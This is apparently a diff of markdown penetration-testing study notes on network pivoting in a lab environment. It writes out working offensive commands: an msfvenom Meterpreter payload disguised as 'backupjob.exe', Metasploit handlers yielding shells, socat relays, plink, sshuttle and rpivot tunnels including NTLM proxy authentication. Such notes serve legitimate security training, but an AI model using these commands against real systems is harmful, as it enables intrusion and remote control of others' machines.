 **Configuring & Starting the multi/handler**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`msf6 >`**
+
+</td>
+<td>
 
 ```bash
 use exploit/multi/handler
@@ -1452,9 +2246,25 @@ run
 # [*] Started HTTPS reverse handler on https://0.0.0.0:80
 ```
 
+</td>
+</tr>
+</table>
+
 We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.
 
 **Establishing the Meterpreter Session**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Meterpreter</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`meterpreter >`**
+
+</td>
+<td>
 
 ```bash
 # [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
@@ -1465,6 +2275,10 @@ We can test this by running our payload on the windows host again, and we should
 meterpreter > getuid
 # Server username: INLANEFREIGHT\victor
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -1508,11 +2322,30 @@ flowchart LR
 
 **Creating the Windows Payload**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 # [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 # [-] No arch selected, selecting arch: x64 from the payload
 # No encoder specified, outputting raw payload
@@ -1521,25 +2354,72 @@ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
 # Saved as: backupjob.exe
 ```
 
+</td>
+</tr>
+</table>
+
 We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.
 
 **Starting Socat Bind Shell Listener in the Ubuntu Server**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`ubuntu@pivot:~$`**
+
+</td>
+<td>
 
 ```bash
 socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
 ```
 
+</td>
+</tr>
+</table>
+
 Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)
 
 **Configuring & Starting the Bind multi/handler**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo msfconsole
 ```
 
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 💣 <b>Metasploit</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`msf6 >`**
+
+</td>
+<td>
+
 ```bash
 use exploit/multi/handler
-
 # [*] Using configured payload generic/shell_reverse_tcp
 set payload windows/x64/meterpreter/bind_tcp
 # payload => windows/x64/meterpreter/bind_tcp
@@ -1548,21 +2428,35 @@ set RHOST 10.129.202.64
 set LPORT 8080
 # LPORT => 8080
 run
-
 # [*] Started bind TCP handler against 10.129.202.64:8080
 ```
+
+</td>
+</tr>
+</table>
 
 We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
 
 **Establishing Meterpreter Session**
 
-```bash
+<table width="100%">
+<tr>
+<td> 💣 <b>Meterpreter</b> </td>
+</tr>
+<tr>
+<td>
+
+```
 # [*] Sending stage (200262 bytes) to 10.129.202.64
 # [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
 
 meterpreter > getuid
 # Server username: INLANEFREIGHT\victor
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -1667,9 +2561,25 @@ The Windows attack host starts a plink.exe process to start a dynamic port forwa
 
 **Using Plink.exe**
 
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows Attack Host</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
 ```cmd
 plink -ssh -D 9050 ubuntu@10.129.15.50
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -1698,9 +2608,25 @@ You can create a Proxifier profile that specifies:
 
 Once the SOCKS server is configured (127.0.0.1:9050), you can directly launch:
 
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows Attack Host</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
 ```cmd
 mstsc.exe
 ```
+
+</td>
+</tr>
+</table>
 
 This starts an RDP session with a Windows target that permits RDP connections, using the tunnel established through Proxifier.
 
@@ -1717,19 +2643,54 @@ One interesting usage of _sshuttle_ is that we don't need to use _proxychains_ t
 
 **Install sshuttle**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 sudo apt-get install sshuttle
 ```
+
+</td>
+</tr>
+</table>
 
 To use _sshuttle_, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network `172.16.5.0/23`.
 
 **Run sshuttle**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 # Starting sshuttle proxy (version 1.1.0).
 # c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
 # fw: Starting firewall with Python version 3.9.2
@@ -1771,15 +2732,38 @@ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
 # fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300
 ```
 
+</td>
+</tr>
+</table>
+
 With this command, _sshuttle_ creates an entry in our iptables to redirect all traffic to the `172.16.5.0/23` network through the pivot host.
 
 **Traffic Routing through iptables Routes**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 # Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 # Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-01 12:54 CST
 # NSE: Loaded 156 scripts for scanning.
@@ -1861,6 +2845,10 @@ sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
 #            Raw packets sent: 236 (14.992KB) | Rcvd: 360 (24.634KB)
 ```
 
+</td>
+</tr>
+</table>
+
 We can now use any tool directly without using proxychains.
 
 </details>
@@ -1901,11 +2889,39 @@ flowchart LR
 
 **Cloning rpivot**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 git clone https://github.com/klsecservices/rpivot.git
 ```
 
+</td>
+</tr>
+</table>
+
 **Installation of Python2.7**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 curl https://pyenv.run | bash
@@ -1917,39 +2933,114 @@ pyenv install 2.7
 pyenv shell 2.7
 ```
 
+</td>
+</tr>
+</table>
+
 We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
 
 **Running server.py from the Attack Host**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
 ```
 
+</td>
+</tr>
+</table>
+
 **Setting SOCKS5**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo sed -i '/^socks/d' /etc/proxychains.conf && echo 'socks5 127.0.0.1 9050' | sudo tee -a /etc/proxychains.conf
 ```
 
+</td>
+</tr>
+</table>
+
 Before running client.py we will need to transfer rpivot folder to the target. We can do this using this SCP command:
 
 **Transferring rpivot to the Target**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
 ```
 
+</td>
+</tr>
+</table>
+
 **Running client.py from Pivot Target**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`ubuntu@pivot:~$`**
+
+</td>
+<td>
 
 ```bash
 python2.7 client.py --server-ip 10.10.15.165 --server-port 9999
 ```
 
-```bash
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 # Backconnecting to server 10.10.14.18 port 9999
 
 # New connection from host 10.129.202.64, source port 35226
 ```
+
+</td>
+</tr>
+</table>
 
 We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.
 
@@ -1957,17 +3048,49 @@ Finally, we should be able to access the webserver on our server-side, which is 
 
 **Browsing to the Target Webserver using Proxychains**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 proxychains firefox-esr 172.16.5.135:80
 ```
+
+</td>
+</tr>
+</table>
 
 Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:
 
 **Connecting to a Web Server using HTTP-Proxy & NTLM Auth**
 
+<table width="100%">
+<tr>
+<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`ubuntu@pivot:~$`**
+
+</td>
+<td>
+
 ```bash
 python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
